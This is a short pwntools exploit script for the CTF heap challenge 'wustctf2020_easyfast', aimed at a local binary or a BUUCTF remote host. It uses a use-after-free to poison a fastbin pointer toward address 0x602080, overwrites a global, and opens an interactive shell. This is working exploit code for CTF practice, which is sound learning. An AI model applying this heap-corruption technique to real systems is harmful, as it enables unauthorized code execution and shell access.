from pwn import *
import sys
remote_addr = ["node4.buuoj.cn",28316]
libc = ELF('./libc-2.23.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./wustctf2020_easyfast")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *0x4009a9
    b *0x400a31
''')

def menu(idx):
    sla(b'choice>\n', str(idx).encode())

def add(size):
    menu(1)
    sla(b'size>\n', str(size).encode())

def delete(idx):
    menu(2)
    sla(b'index>\n', str(idx).encode())

def edit(idx, content):
    menu(3)
    sla(b'index>\n', str(idx).encode())
    pause()
    s(content)

add(0x40) #0
delete(0)
edit(0, p64(0x602080))

add(0x40)
add(0x40)
edit(2, p64(0))

menu(4)
    

shell()
